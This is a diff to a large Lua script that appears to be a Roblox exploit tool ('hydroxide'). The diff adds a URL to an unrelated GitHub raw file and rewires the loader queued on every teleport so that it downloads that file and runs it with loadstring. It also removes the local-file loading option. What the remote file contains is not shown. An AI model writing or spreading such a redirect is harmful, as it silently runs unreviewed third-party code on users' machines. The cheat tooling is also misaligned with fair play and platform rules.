@@ -3,17 +3,18 @@ if not game:IsLoaded() then
 end
 
 local DEFAULT_RAW = getgenv().hydroxide_raw or "https://git.fable.bz/zyu/hydroxide/raw/branch/main/"
+local CUSTOM_SCRIPT_URL = "https://raw.githubusercontent.com/Gurberson/gurtson/refs/heads/main/Somalihubs"
 local loader_script = string.format([[
 if not game:IsLoaded() then game.Loaded:Wait() end
 task.wait(1)
 getgenv().hydroxide_raw = "%s"
-local s,code=pcall(function() return game:HttpGet("%sloader.lua?nonce="..tostring(math.random())) end)
+local s,code=pcall(function() return game:HttpGet("%s?nonce="..tostring(math.random()), true) end)
 if not s then
     print("[QUEUE ERROR] HttpGet failed:",code)
     return
 end
 local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Response preview:",tostring(code):sub(1,200)) return end local ok,runErr=pcall(fn) if not ok then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end
-]], DEFAULT_RAW, DEFAULT_RAW)
+]], DEFAULT_RAW, CUSTOM_SCRIPT_URL)
 
 local cloneref = cloneref or function(v) return v end
 local Services = setmetatable({}, {
@@ -13329,11 +13330,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                         local queue_func = queueteleport or queue_on_teleport
                         if queue_func then
                             local success, err = pcall(function()
-                                local load = loader_script
-                                if readfile and isfile and isfile("bazaar_loader.lua") then
-                                    load = [[local code=readfile("bazaar_loader.lua") local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Code preview:",code:sub(1,200)) return end local s,runErr=pcall(fn) if not s then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
-                                end
-                                queue_func(load)
+                                queue_func(loader_script)
                             end)
 
                             if not success then
@@ -27087,11 +27084,7 @@ end
                     local queue_func = queueteleport or queue_on_teleport
                     if queue_func then
                         local success, err = pcall(function()
-                            local load = loader_script
-                            if readfile and isfile and isfile("bazaar_loader.lua") then
-                                load = [[local code=readfile("bazaar_loader.lua") local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Code preview:",code:sub(1,200)) return end local s,runErr=pcall(fn) if not s then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
-                            end
-                            queue_func(load)
+                            queue_func(loader_script)
                         end)
                     end
                 end
@@ -27270,4 +27263,3 @@ end
         warn("[hydroxide.sol] Script error:", err)
     end
 end
-
